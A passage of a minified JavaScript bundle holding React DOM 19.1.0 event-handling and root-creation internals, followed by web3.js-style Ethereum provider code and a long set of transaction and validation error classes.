            return i = xf(i),
            Am(i)
        }
        var vu = null;
        function Am(i) {
            if (vu = null,
            i = qs(i),
            i !== null) {
                var r = l(i);
                if (r === null)
                    i = null;
                else {
                    var a = r.tag;
                    if (a === 13) {
                        if (i = u(r),
                        i !== null)
                            return i;
                        i = null
                    } else if (a === 3) {
                        if (r.stateNode.current.memoizedState.isDehydrated)
                            return r.tag === 3 ? r.stateNode.containerInfo : null;
                        i = null
                    } else
                        r !== i && (i = null)
                }
            }
            return vu = i,
            null
        }
        function Ob(i) {
            switch (i) {
            case "beforetoggle":
            case "cancel":
            case "click":
            case "close":
            case "contextmenu":
            case "copy":
            case "cut":
            case "auxclick":
            case "dblclick":
            case "dragend":
            case "dragstart":
            case "drop":
            case "focusin":
            case "focusout":
            case "input":
            case "invalid":
            case "keydown":
            case "keypress":
            case "keyup":
            case "mousedown":
            case "mouseup":
            case "paste":
            case "pause":
            case "play":
            case "pointercancel":
            case "pointerdown":
            case "pointerup":
            case "ratechange":
            case "reset":
            case "resize":
            case "seeked":
            case "submit":
            case "toggle":
            case "touchcancel":
            case "touchend":
            case "touchstart":
            case "volumechange":
            case "change":
            case "selectionchange":
            case "textInput":
            case "compositionstart":
            case "compositionend":
            case "compositionupdate":
            case "beforeblur":
            case "afterblur":
            case "beforeinput":
            case "blur":
            case "fullscreenchange":
            case "focus":
            case "hashchange":
            case "popstate":
            case "select":
            case "selectstart":
                return 2;
            case "drag":
            case "dragenter":
            case "dragexit":
            case "dragleave":
            case "dragover":
            case "mousemove":
            case "mouseout":
            case "mouseover":
            case "pointermove":
            case "pointerout":
            case "pointerover":
            case "scroll":
            case "touchmove":
            case "wheel":
            case "mouseenter":
            case "mouseleave":
            case "pointerenter":
            case "pointerleave":
                return 8;
            case "message":
                switch (uf()) {
                case po:
                    return 2;
                case K:
                    return 8;
                case Ps:
                case go:
                    return 32;
                case Kt:
                    return 268435456;
                default:
                    return 32
                }
            default:
                return 32
            }
        }
        var wm = !1
          , Br = null
          , Cr = null
          , Ir = null
          , ll = new Map
          , cl = new Map
          , kr = []
          , MS = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
        function Nb(i, r) {
            switch (i) {
            case "focusin":
            case "focusout":
                Br = null;
                break;
            case "dragenter":
            case "dragleave":
                Cr = null;
                break;
            case "mouseover":
            case "mouseout":
                Ir = null;
                break;
            case "pointerover":
            case "pointerout":
                ll.delete(r.pointerId);
                break;
            case "gotpointercapture":
            case "lostpointercapture":
                cl.delete(r.pointerId)
            }
        }
        function ul(i, r, a, c, f, g) {
            return i === null || i.nativeEvent !== g ? (i = {
                blockedOn: r,
                domEventName: a,
                eventSystemFlags: c,
                nativeEvent: g,
                targetContainers: [f]
            },
            r !== null && (r = Fs(r),
            r !== null && kb(r)),
            i) : (i.eventSystemFlags |= c,
            r = i.targetContainers,
            f !== null && r.indexOf(f) === -1 && r.push(f),
            i)
        }
        function DS(i, r, a, c, f) {
            switch (r) {
            case "focusin":
                return Br = ul(Br, i, r, a, c, f),
                !0;
            case "dragenter":
                return Cr = ul(Cr, i, r, a, c, f),
                !0;
            case "mouseover":
                return Ir = ul(Ir, i, r, a, c, f),
                !0;
            case "pointerover":
                var g = f.pointerId;
                return ll.set(g, ul(ll.get(g) || null, i, r, a, c, f)),
                !0;
            case "gotpointercapture":
                return g = f.pointerId,
                cl.set(g, ul(cl.get(g) || null, i, r, a, c, f)),
                !0
            }
            return !1
        }
        function Mb(i) {
            var r = qs(i.target);
            if (r !== null) {
                var a = l(r);
                if (a !== null) {
                    if (r = a.tag,
                    r === 13) {
                        if (r = u(a),
                        r !== null) {
                            i.blockedOn = r,
                            BE(i.priority, function() {
                                if (a.tag === 13) {
                                    var c = _n();
                                    c = hf(c);
                                    var f = na(a, c);
                                    f !== null && En(f, a, c),
                                    ym(a, c)
                                }
                            });
                            return
                        }
                    } else if (r === 3 && a.stateNode.current.memoizedState.isDehydrated) {
                        i.blockedOn = a.tag === 3 ? a.stateNode.containerInfo : null;
                        return
                    }
                }
            }
            i.blockedOn = null
        }
        function bu(i) {
            if (i.blockedOn !== null)
                return !1;
            for (var r = i.targetContainers; 0 < r.length; ) {
                var a = bm(i.nativeEvent);
                if (a === null) {
                    a = i.nativeEvent;
                    var c = new a.constructor(a.type,a);
                    Ef = c,
                    a.target.dispatchEvent(c),
                    Ef = null
                } else
                    return r = Fs(a),
                    r !== null && kb(r),
                    i.blockedOn = a,
                    !1;
                r.shift()
            }
            return !0
        }
        function Db(i, r, a) {
            bu(i) && a.delete(r)
        }
        function LS() {
            wm = !1,
            Br !== null && bu(Br) && (Br = null),
            Cr !== null && bu(Cr) && (Cr = null),
            Ir !== null && bu(Ir) && (Ir = null),
            ll.forEach(Db),
            cl.forEach(Db)
        }
        function Au(i, r) {
            i.blockedOn === r && (i.blockedOn = null,
            wm || (wm = !0,
            t.unstable_scheduleCallback(t.unstable_NormalPriority, LS)))
        }
        var wu = null;
        function Lb(i) {
            wu !== i && (wu = i,
            t.unstable_scheduleCallback(t.unstable_NormalPriority, function() {
                wu === i && (wu = null);
                for (var r = 0; r < i.length; r += 3) {
                    var a = i[r]
                      , c = i[r + 1]
                      , f = i[r + 2];
                    if (typeof c != "function") {
                        if (Am(c || a) === null)
                            continue;
                        break
                    }
                    var g = Fs(a);
                    g !== null && (i.splice(r, 3),
                    r -= 3,
                    Ah(g, {
                        pending: !0,
                        data: f,
                        method: a.method,
                        action: c
                    }, c, f))
                }
            }))
        }
        function dl(i) {
            function r(C) {
                return Au(C, i)
            }
            Br !== null && Au(Br, i),
            Cr !== null && Au(Cr, i),
            Ir !== null && Au(Ir, i),
            ll.forEach(r),
            cl.forEach(r);
            for (var a = 0; a < kr.length; a++) {
                var c = kr[a];
                c.blockedOn === i && (c.blockedOn = null)
            }
            for (; 0 < kr.length && (a = kr[0],
            a.blockedOn === null); )
                Mb(a),
                a.blockedOn === null && kr.shift();
            if (a = (i.ownerDocument || i).$$reactFormReplay,
            a != null)
                for (c = 0; c < a.length; c += 3) {
                    var f = a[c]
                      , g = a[c + 1]
                      , v = f[sn] || null;
                    if (typeof g == "function")
                        v || Lb(a);
                    else if (v) {
                        var A = null;
                        if (g && g.hasAttribute("formAction")) {
                            if (f = g,
                            v = g[sn] || null)
                                A = v.formAction;
                            else if (Am(f) !== null)
                                continue
                        } else
                            A = v.action;
                        typeof A == "function" ? a[c + 1] = A : (a.splice(c, 3),
                        c -= 3),
                        Lb(a)
                    }
                }
        }
        function _m(i) {
            this._internalRoot = i
        }
        _u.prototype.render = _m.prototype.render = function(i) {
            var r = this._internalRoot;
            if (r === null)
                throw Error(s(409));
            var a = r.current
              , c = _n();
            Cb(a, c, i, r, null, null)
        }
        ,
        _u.prototype.unmount = _m.prototype.unmount = function() {
            var i = this._internalRoot;
            if (i !== null) {
                this._internalRoot = null;
                var r = i.containerInfo;
                Cb(i.current, 2, null, i, null, null),
                iu(),
                r[Gs] = null
            }
        }
        ;
        function _u(i) {
            this._internalRoot = i
        }
        _u.prototype.unstable_scheduleHydration = function(i) {
            if (i) {
                var r = W0();
                i = {
                    blockedOn: null,
                    target: i,
                    priority: r
                };
                for (var a = 0; a < kr.length && r !== 0 && r < kr[a].priority; a++)
                    ;
                kr.splice(a, 0, i),
                a === 0 && Mb(i)
            }
        }
        ;
        var Ub = e.version;
        if (Ub !== "19.1.0")
            throw Error(s(527, Ub, "19.1.0"));
        P.findDOMNode = function(i) {
            var r = i._reactInternals;
            if (r === void 0)
                throw typeof i.render == "function" ? Error(s(188)) : (i = Object.keys(i).join(","),
                Error(s(268, i)));
            return i = p(r),
            i = i !== null ? h(i) : null,
            i = i === null ? null : i.stateNode,
            i
        }
        ;
        var US = {
            bundleType: 0,
            version: "19.1.0",
            rendererPackageName: "react-dom",
            currentDispatcherRef: T,
            reconcilerVersion: "19.1.0"
        };
        if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
            var Eu = __REACT_DEVTOOLS_GLOBAL_HOOK__;
            if (!Eu.isDisabled && Eu.supportsFiber)
                try {
                    ct = Eu.inject(US),
                    st = Eu
                } catch {}
        }
        return hl.createRoot = function(i, r) {
            if (!o(i))
                throw Error(s(299));
            var a = !1
              , c = ""
              , f = Wy
              , g = ev
              , v = tv
              , A = null;
            return r != null && (r.unstable_strictMode === !0 && (a = !0),
            r.identifierPrefix !== void 0 && (c = r.identifierPrefix),
            r.onUncaughtError !== void 0 && (f = r.onUncaughtError),
            r.onCaughtError !== void 0 && (g = r.onCaughtError),
            r.onRecoverableError !== void 0 && (v = r.onRecoverableError),
            r.unstable_transitionCallbacks !== void 0 && (A = r.unstable_transitionCallbacks)),
            r = Rb(i, 1, !1, null, null, a, c, f, g, v, A, null),
            i[Gs] = r.current,
            rm(i),
            new _m(r)
        }
        ,
        hl.hydrateRoot = function(i, r, a) {
            if (!o(i))
                throw Error(s(299));
            var c = !1
              , f = ""
              , g = Wy
              , v = ev
              , A = tv
              , C = null
              , j = null;
            return a != null && (a.unstable_strictMode === !0 && (c = !0),
            a.identifierPrefix !== void 0 && (f = a.identifierPrefix),
            a.onUncaughtError !== void 0 && (g = a.onUncaughtError),
            a.onCaughtError !== void 0 && (v = a.onCaughtError),
            a.onRecoverableError !== void 0 && (A = a.onRecoverableError),
            a.unstable_transitionCallbacks !== void 0 && (C = a.unstable_transitionCallbacks),
            a.formState !== void 0 && (j = a.formState)),
            r = Rb(i, 1, !0, r, a ?? null, c, f, g, v, A, C, j),
            r.context = Bb(null),
            a = r.current,
            c = _n(),
            c = hf(c),
            f = mr(c),
            f.callback = null,
            pr(a, f, c),
            a = c,
            r.current.lanes = a,
            yo(r, a),
            ci(r),
            i[Gs] = r.current,
            rm(i),
            new _u(r)
        }
        ,
        hl.version = "19.1.0",
        hl
    }
    var Yb;
    function ZS() {
        if (Yb)
            return Sm.exports;
        Yb = 1;
        function t() {
            if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
                try {
                    __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(t)
                } catch (e) {
                    console.error(e)
                }
        }
        return t(),
        Sm.exports = YS(),
        Sm.exports
    }
    var KS = ZS(), Qn;
    (function(t) {
        t.NUMBER = "NUMBER_NUMBER",
        t.HEX = "NUMBER_HEX",
        t.STR = "NUMBER_STR",
        t.BIGINT = "NUMBER_BIGINT"
    }
    )(Qn || (Qn = {}));
    var er;
    (function(t) {
        t.HEX = "BYTES_HEX",
        t.UINT8ARRAY = "BYTES_UINT8ARRAY"
    }
    )(er || (er = {}));
    const $t = {
        number: Qn.BIGINT,
        bytes: er.HEX
    }
      , Ce = {
        number: Qn.HEX,
        bytes: er.HEX
    };
    var Xi;
    (function(t) {
        t.EARLIEST = "earliest",
        t.LATEST = "latest",
        t.PENDING = "pending",
        t.SAFE = "safe",
        t.FINALIZED = "finalized",
        t.COMMITTED = "committed"
    }
    )(Xi || (Xi = {}));
    var xl;
    (function(t) {
        t.chainstart = "chainstart",
        t.frontier = "frontier",
        t.homestead = "homestead",
        t.dao = "dao",
        t.tangerineWhistle = "tangerineWhistle",
        t.spuriousDragon = "spuriousDragon",
        t.byzantium = "byzantium",
        t.constantinople = "constantinople",
        t.petersburg = "petersburg",
        t.istanbul = "istanbul",
        t.muirGlacier = "muirGlacier",
        t.berlin = "berlin",
        t.london = "london",
        t.altair = "altair",
        t.arrowGlacier = "arrowGlacier",
        t.grayGlacier = "grayGlacier",
        t.bellatrix = "bellatrix",
        t.merge = "merge",
        t.capella = "capella",
        t.shanghai = "shanghai"
    }
    )(xl || (xl = {}));
    const Hp = Object.getPrototypeOf(Uint8Array);
    var Zb = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const Kb = Symbol.for("web3/base-provider");
    class nc {
        static isWeb3Provider(e) {
            return e instanceof nc || !!(e && e[Kb])
        }
        get[Kb]() {
            return !0
        }
        send(e, n) {
            this.request(e).then(s => {
                n(null, s)
            }
            ).catch(s => {
                n(s)
            }
            )
        }
        sendAsync(e) {
            return Zb(this, void 0, void 0, function*() {
                return this.request(e)
            })
        }
        asEIP1193Provider() {
            const e = Object.create(this)
              , n = e.request;
            return e.request = function(o) {
                return Zb(this, void 0, void 0, function*() {
                    return (yield n(o)).result
                })
            }
            ,
            e.asEIP1193Provider = void 0,
            e
        }
    }
    class XS extends Array {
        constructor(e) {
            super(),
            this._accountProvider = e
        }
    }
    const JS = 100
      , $S = 101
      , WS = 201
      , e2 = 202
      , t2 = 203
      , n2 = 204
      , i2 = 205
      , r2 = 206
      , s2 = 207
      , a2 = 208
      , o2 = 300
      , l2 = 301
      , c2 = 310
      , u2 = 311
      , d2 = 400
      , f2 = 402
      , h2 = 405
      , m2 = 407
      , p2 = 408
      , g2 = 410
      , y2 = 411
      , v2 = 412
      , b2 = 413
      , A2 = 414
      , w2 = 415
      , _2 = 416
      , E2 = 417
      , x2 = 418
      , S2 = 419
      , T2 = 420
      , R2 = 421
      , B2 = 422
      , C2 = 423
      , I2 = 424
      , k2 = 425
      , O2 = 426
      , N2 = 427
      , M2 = 428
      , D2 = 429
      , L2 = 430
      , U2 = 431
      , j2 = 432
      , P2 = 433
      , H2 = 434
      , z2 = 435
      , G2 = 436
      , q2 = 437
      , F2 = 438
      , Q2 = 439
      , V2 = 440
      , Y2 = 441
      , Z2 = 500
      , K2 = 503
      , X2 = 505
      , J2 = 506
      , $2 = 507
      , W2 = 600
      , eT = 602
      , tT = 603
      , nT = 604
      , iT = 701
      , rT = 702
      , sT = 703
      , aT = 704
      , oT = 705
      , lT = 706
      , cT = 707
      , uT = 709
      , dT = 801
      , fT = 802
      , hT = 4001
      , mT = 4100
      , pT = 4200
      , gT = 4900
      , yT = 4901
      , vT = 902
      , bT = 903
      , AT = 1001
      , wT = 1002
      , _T = 1003
      , ET = 1004
      , xT = 1005
      , ST = 1006
      , TT = 1008
      , RT = 1009
      , BT = 1010
      , CT = 1011
      , IT = 1012
      , kT = 1014
      , OT = 1015
      , NT = 1100
      , h1 = 1101
      , MT = 1200
      , zu = -32700
      , Gu = -32600
      , qu = -32601
      , Fu = -32602
      , Qu = -32603
      , Vu = -32e3
      , Yu = -32001
      , Zu = -32002
      , Ku = -32003
      , Xu = -32004
      , Ju = -32005
      , $u = -32006;
    class Re extends Error {
        get innerError() {
            return this.cause instanceof Sl ? this.cause.errors : this.cause
        }
        set innerError(e) {
            Array.isArray(e) ? this.cause = new Sl(e) : this.cause = e
        }
        constructor(e, n) {
            super(e),
            Array.isArray(n) ? this.cause = new Sl(n) : this.cause = n,
            this.name = this.constructor.name,
            typeof Error.captureStackTrace == "function" ? Error.captureStackTrace(new.target.constructor) : this.stack = new Error().stack
        }
        static convertToString(e, n=!1) {
            if (e == null)
                return "undefined";
            const s = JSON.stringify(e, (o, l) => typeof l == "bigint" ? l.toString() : l);
            return n && ["bigint", "string"].includes(typeof e) ? s.replace(/['\\"]+/g, "") : s
        }
        toJSON() {
            return {
                name: this.name,
                code: this.code,
                message: this.message,
                cause: this.cause,
                innerError: this.cause
            }
        }
    }
    class Sl extends Re {
        constructor(e) {
            super(`Multiple errors occurred: [${e.map(n => n.message).join("], [")}]`),
            this.code = a2,
            this.errors = e
        }
    }
    class Le extends Re {
        constructor(e, n) {
            super(`Invalid value given "${Re.convertToString(e, !0)}". Error: ${n}.`),
            this.name = this.constructor.name
        }
    }
    class Xb extends Re {
        constructor() {
            super("Private key must be 32 bytes."),
            this.code = iT
        }
    }
    class DT extends Re {
        constructor() {
            super("Invalid Private Key, Not a valid string or uint8Array"),
            this.code = rT
        }
    }
    class LT extends Re {
        constructor(e) {
            super(`"${e}"`),
            this.code = fT
        }
    }
    class m1 extends Re {
        constructor() {
            super("Invalid key derivation function"),
            this.code = sT
        }
    }
    class UT extends Re {
        constructor() {
            super("Key derivation failed - possibly wrong password"),
            this.code = aT
        }
    }
    class jT extends Re {
        constructor() {
            super("Unsupported key store version"),
            this.code = oT
        }
    }
    class PT extends Re {
        constructor() {
            super("Password cannot be empty"),
            this.code = lT
        }
    }
    class HT extends Re {
        constructor() {
            super("Initialization vector must be 16 bytes"),
            this.code = cT
        }
    }
    class zT extends Re {
        constructor() {
            super("c > 1000, pbkdf2 is less secure with less iterations"),
            this.code = uT
        }
    }
    class ic extends Re {
        constructor(e, n) {
            super(e),
            this.code = Z2,
            n && (this.errorCode = n.code,
            this.errorReason = n.reason)
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                errorCode: this.errorCode,
                errorReason: this.errorReason
            })
        }
    }
    class Wm extends ic {
        constructor(e) {
            super("Connection not open", e),
            this.code = K2
        }
    }
    class GT extends ic {
        constructor(e) {
            super(`Maximum number of reconnect attempts reached! (${e})`),
            this.code = X2
        }
    }
    class qT extends ic {
        constructor() {
            super("CONNECTION ERROR: Provider started to reconnect before the response got received!"),
            this.code = J2
        }
    }
    class FT extends ic {
        constructor(e) {
            super(`Request already sent with following id: ${e}`),
            this.code = $2
        }
    }
    class Wt extends Re {
        constructor(e, n) {
            super(e),
            this.code = o2,
            this.receipt = n
        }
    }
    class Jb extends Re {
        constructor(e, n) {
            super(`The resolver at ${e} does not implement requested method: "${n}".`),
            this.address = e,
            this.name = n,
            this.code = l2
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                address: this.address,
                name: this.name
            })
        }
    }
    class Dd extends Wt {
        constructor(e) {
            if (super(e.message || "Error"),
            this.name = "name"in e && e.name || this.constructor.name,
            this.stack = "stack"in e && e.stack || void 0,
            this.code = e.code,
            typeof e.data == "object") {
                let n;
                e.data && "originalError"in e.data ? n = e.data.originalError : n = e.data,
                this.data = n.data,
                this.cause = new Dd(n)
            } else
                this.data = e.data
        }
        setDecodedProperties(e, n, s) {
            this.errorName = e,
            this.errorSignature = n,
            this.errorArgs = s
        }
        toJSON() {
            let e = Object.assign(Object.assign({}, super.toJSON()), {
                data: this.data
            });
            return this.errorName && (e = Object.assign(Object.assign({}, e), {
                errorName: this.errorName,
                errorSignature: this.errorSignature,
                errorArgs: this.errorArgs
            })),
            e
        }
    }
    class As extends Wt {
        constructor(e) {
            super("Error happened while trying to execute a function inside a smart contract"),
            this.code = c2,
            this.cause = new Dd(e)
        }
    }
    class QT extends Le {
        constructor(e) {
            var n, s;
            super(`data: ${(n = e.data) !== null && n !== void 0 ? n : "undefined"}, input: ${(s = e.input) !== null && s !== void 0 ? s : "undefined"}`, `You can't have "data" and "input" as properties of a contract at the same time, please use either "data" or "input" instead.`),
            this.code = u2
        }
    }
    class VT extends Re {
        constructor(e) {
            super(`ENS is not supported on network ${e}`),
            this.code = vT
        }
    }
    class YT extends Re {
        constructor() {
            super("Network not synced"),
            this.code = bT
        }
    }
    class $b extends Re {
        constructor(e) {
            super(`Invalid parameters passed. "${typeof e < "u" ? e : ""}"`),
            this.hint = e,
            this.code = s2
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                hint: this.hint
            })
        }
    }
    class ep extends Re {
        constructor() {
            super(...arguments),
            this.code = WS
        }
    }
    class zi extends Re {
        constructor() {
            super("The method you're trying to call is not implemented."),
            this.code = e2
        }
    }
    class p1 extends Re {
        constructor() {
            super(...arguments),
            this.code = t2
        }
    }
    class ZT extends Re {
        constructor() {
            super(...arguments),
            this.code = n2
        }
    }
    class Ge extends Re {
        constructor(e, n) {
            super(e),
            this.code = i2,
            this.props = n ?? {}
        }
    }
    class KT extends Re {
        constructor(e) {
            super(`A plugin with the namespace: ${e} has already been registered.`),
            this.code = r2
        }
    }
    class Iu extends Re {
        constructor() {
            super(...arguments),
            this.code = W2
        }
    }
    class tp extends Re {
        constructor(e) {
            super(`Client URL "${e}" is invalid.`),
            this.code = eT
        }
    }
    class Yi extends Re {
        constructor() {
            super(...arguments),
            this.code = tT
        }
    }
    class XT extends Re {
        constructor() {
            super(...arguments),
            this.code = nT
        }
    }
    class JT extends Le {
        constructor() {
            super(...arguments),
            this.code = dT
        }
    }
    class zp extends Re {
        constructor(e, n) {
            super(e),
            this.receipt = n,
            this.code = d2
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                receipt: this.receipt
            })
        }
    }
    class Wu extends Re {
        constructor(e, n, s, o) {
            super(`Transaction has been reverted by the EVM${s === void 0 ? "" : `:
 ${Re.convertToString(s)}`}`),
            this.reason = e,
            this.signature = n,
            this.receipt = s,
            this.data = o,
            this.code = f2
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                reason: this.reason,
                signature: this.signature,
                receipt: this.receipt,
                data: this.data
            })
        }
    }
    class g1 extends Wu {
        constructor(e, n, s, o, l, u, d) {
            super(e),
            this.reason = e,
            this.customErrorName = n,
            this.customErrorDecodedSignature = s,
            this.customErrorArguments = o,
            this.signature = l,
            this.receipt = u,
            this.data = d,
            this.code = F2
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                reason: this.reason,
                customErrorName: this.customErrorName,
                customErrorDecodedSignature: this.customErrorDecodedSignature,
                customErrorArguments: this.customErrorArguments,
                signature: this.signature,
                receipt: this.receipt,
                data: this.data
            })
        }
    }
    class y1 extends zp {
        constructor(e) {
            super(`Transaction has been reverted by the EVM${e === void 0 ? "" : `:
 ${Re.convertToString(e)}`}`, e),
            this.code = h2
        }
    }
    class $T extends zp {
        constructor() {
            super("Raw transaction undefined"),
            this.code = m2
        }
    }
    class Wb extends zp {
        constructor() {
            super("Transaction not found"),
            this.code = L2
        }
    }
    class WT extends Le {
        constructor(e) {
            super(e, "invalid transaction with invalid sender"),
            this.code = p2
        }
    }
    class eR extends Le {
        constructor(e) {
            super(e, "invalid transaction with invalid receiver"),
            this.code = q2
        }
    }
    class tR extends Le {
        constructor() {
            super("MissingCustomChainError", "If tx.common is provided it must have tx.common.customChain"),
            this.code = g2
        }
    }
    class nR extends Le {
        constructor() {
            super("MissingCustomChainIdError", "If tx.common is provided it must have tx.common.customChain and tx.common.customChain.chainId"),
            this.code = y2
        }
    }
    class iR extends Le {
        constructor(e) {
            super(JSON.stringify(e), "Chain Id doesnt match in tx.chainId tx.common.customChain.chainId"),
            this.code = v2
        }
    }
    class rR extends Le {
        constructor(e) {
            super(JSON.stringify(e), "Chain doesnt match in tx.chain tx.common.basechain"),
            this.code = z2
        }
    }
    class sR extends Le {
        constructor(e) {
            super(JSON.stringify(e), "hardfork doesnt match in tx.hardfork tx.common.hardfork"),
            this.code = G2
        }
    }
    class aR extends Le {
        constructor() {
            super("CommonOrChainAndHardforkError", "Please provide the common object or the chain and hardfork property but not all together."),
            this.code = b2
        }
    }
    class oR extends Le {
        constructor(e) {
            var n, s;
            super("MissingChainOrHardforkError", `When specifying chain and hardfork, both values must be defined. Received "chain": ${(n = e.chain) !== null && n !== void 0 ? n : "undefined"}, "hardfork": ${(s = e.hardfork) !== null && s !== void 0 ? s : "undefined"}`),
            this.code = A2
        }
    }
    class lR extends Re {
        constructor() {
            super('Missing properties in transaction, either define "gas" and "gasPrice" for type 0 transactions or "gas", "maxPriorityFeePerGas" and "maxFeePerGas" for type 2 transactions'),
            this.code = V2
        }
    }
    class cR extends Le {
        constructor(e) {
            var n, s, o, l;
            super(`gas: ${(n = e.gas) !== null && n !== void 0 ? n : "undefined"}, gasPrice: ${(s = e.gasPrice) !== null && s !== void 0 ? s : "undefined"}, maxPriorityFeePerGas: ${(o = e.maxPriorityFeePerGas) !== null && o !== void 0 ? o : "undefined"}, maxFeePerGas: ${(l = e.maxFeePerGas) !== null && l !== void 0 ? l : "undefined"}`, '"gas" is missing'),
            this.code = w2,
            this.cause = new lR
        }
    }
    class uR extends Re {
        constructor() {
            super('Missing properties in transaction, either define "gas" and "gasPrice" for type 0 transactions or "gas", "maxPriorityFeePerGas" and "maxFeePerGas" for type 2 transactions, not both'),
            this.code = Y2
        }
    }
    class dR extends Le {
        constructor(e) {
            var n, s, o, l;
            super(`gas: ${(n = e.gas) !== null && n !== void 0 ? n : "undefined"}, gasPrice: ${(s = e.gasPrice) !== null && s !== void 0 ? s : "undefined"}, maxPriorityFeePerGas: ${(o = e.maxPriorityFeePerGas) !== null && o !== void 0 ? o : "undefined"}, maxFeePerGas: ${(l = e.maxFeePerGas) !== null && l !== void 0 ? l : "undefined"}`, "transaction must specify legacy or fee market gas properties, not both"),
            this.code = H2,
            this.cause = new uR
        }
    }
    class fR extends Le {
        constructor(e) {
            var n, s;
            super(`gas: ${(n = e.gas) !== null && n !== void 0 ? n : "undefined"}, gasPrice: ${(s = e.gasPrice) !== null && s !== void 0 ? s : "undefined"}`, "Gas or gasPrice is lower than 0"),
            this.code = _2
        }
    }
    class hR extends Le {
        constructor(e) {
            var n, s;
            super(`maxPriorityFeePerGas: ${(n = e.maxPriorityFeePerGas) !== null && n !== void 0 ? n : "undefined"}, maxFeePerGas: ${(s = e.maxFeePerGas) !== null && s !== void 0 ? s : "undefined"}`, "maxPriorityFeePerGas or maxFeePerGas is lower than 0"),
            this.code = E2
        }
    }
    class mR extends Le {
        constructor(e) {
            super(e, "eip-1559 transactions don't support gasPrice"),
            this.code = x2
        }
    }
    class v1 extends Le {
        constructor(e) {
            var n, s;
            super(`maxPriorityFeePerGas: ${(n = e.maxPriorityFeePerGas) !== null && n !== void 0 ? n : "undefined"}, maxFeePerGas: ${(s = e.maxFeePerGas) !== null && s !== void 0 ? s : "undefined"}`, "pre-eip-1559 transaction don't support maxFeePerGas/maxPriorityFeePerGas"),
            this.code = S2
        }
    }
    class pR extends Le {
        constructor(e) {
            super(e, "invalid transaction object"),
            this.code = T2
        }
    }
    class gR extends Le {
        constructor(e) {
            var n, s;
            super(`nonce: ${(n = e.nonce) !== null && n !== void 0 ? n : "undefined"}, chainId: ${(s = e.chainId) !== null && s !== void 0 ? s : "undefined"}`, "Nonce or chainId is lower than 0"),
            this.code = R2
        }
    }
    class yR extends Le {
        constructor() {
            super("UnableToPopulateNonceError", "unable to populate nonce, no from address available"),
            this.code = B2
        }
    }
    class vR extends Le {
        constructor() {
            super("Eip1559NotSupportedError", "Network doesn't support eip-1559"),
            this.code = C2
        }
    }
    class eA extends Le {
        constructor(e) {
            super(e, "unsupported transaction type"),
            this.code = I2
        }
    }
    class b1 extends Le {
        constructor(e) {
            var n, s;
            super(`data: ${(n = e.data) !== null && n !== void 0 ? n : "undefined"}, input: ${(s = e.input) !== null && s !== void 0 ? s : "undefined"}`, `You can't have "data" and "input" as properties of transactions at the same time, please use either "data" or "input" instead.`),
            this.code = k2
        }
    }
    class bR extends Re {
        constructor(e) {
            super(`The connected Ethereum Node did not respond within ${e.numberOfSeconds} seconds, please make sure your transaction was properly sent and you are connected to a healthy Node. Be aware that transaction might still be pending or mined!
	Transaction Hash: ${e.transactionHash ? e.transactionHash.toString() : "not available"}`),
            this.code = U2
        }
    }
    function A1(t) {
        return `Please make sure your transaction was properly sent and there are no previous pending transaction for the same account. However, be aware that it might still be mined!
	Transaction Hash: ${t ? t.toString() : "not available"}`
    }
    class w1 extends Re {
        constructor(e) {
            super(`Transaction was not mined within ${e.numberOfSeconds} seconds. ${A1(e.transactionHash)}`),
            this.code = O2
        }
    }
    class _1 extends Re {
        constructor(e) {
            super(`Transaction started at ${e.starterBlockNumber} but was not mined within ${e.numberOfBlocks} blocks. ${A1(e.transactionHash)}`),
            this.code = j2
        }
    }
    class AR extends Le {
        constructor(e) {
            var n, s;
            super(`receipt: ${JSON.stringify(e.receipt)}, blockHash: ${(n = e.blockHash) === null || n === void 0 ? void 0 : n.toString()}, transactionHash: ${(s = e.transactionHash) === null || s === void 0 ? void 0 : s.toString()}`, "Receipt missing or blockHash null"),
            this.code = N2
        }
    }
    class wR extends Le {
        constructor(e) {
            super(`receipt: ${JSON.stringify(e.receipt)}`, "Receipt missing block number"),
            this.code = M2
        }
    }
    class np extends Re {
        constructor(e) {
            super(`Invalid signature. "${e}"`),
            this.code = P2
        }
    }
    class tA extends Le {
        constructor() {
            super("LocalWalletNotAvailableError", "Attempted to index account in local wallet, but no wallet is available"),
            this.code = D2
        }
    }
    class _R extends Re {
        constructor(e, n) {
            const s = [];
            e.forEach(o => s.push(o.keyword)),
            super(`The following properties are invalid for the transaction type ${n}: ${s.join(", ")}`),
            this.code = Q2
        }
    }
    class ja extends Le {
        constructor(e) {
            super(e, "can not parse as byte data"),
            this.code = wT
        }
    }
    class Gp extends Le {
        constructor(e) {
            super(e, "can not parse as number data"),
            this.code = _T
        }
    }
    class qp extends Le {
        constructor(e) {
            super(e, "invalid ethereum address"),
            this.code = xT
        }
    }
    class ER extends Le {
        constructor(e) {
            super(e, "not a valid string"),
            this.code = AT
        }
    }
    class E1 extends Le {
        constructor(e) {
            super(e, "invalid unit"),
            this.code = ET
        }
    }
    class x1 extends Le {
        constructor(e) {
            super(e, "not a valid unit. Must be a positive integer"),
            this.code = OT
        }
    }
    class xR extends Le {
        constructor(e) {
            super(e, "can not be converted to hex"),
            this.code = ST
        }
    }
    class S1 extends Le {
        constructor(e) {
            super(e, "value greater than the nibble width"),
            this.code = kT
        }
    }
    class Fp extends Le {
        constructor(e) {
            super(e, "not a valid boolean."),
            this.code = TT
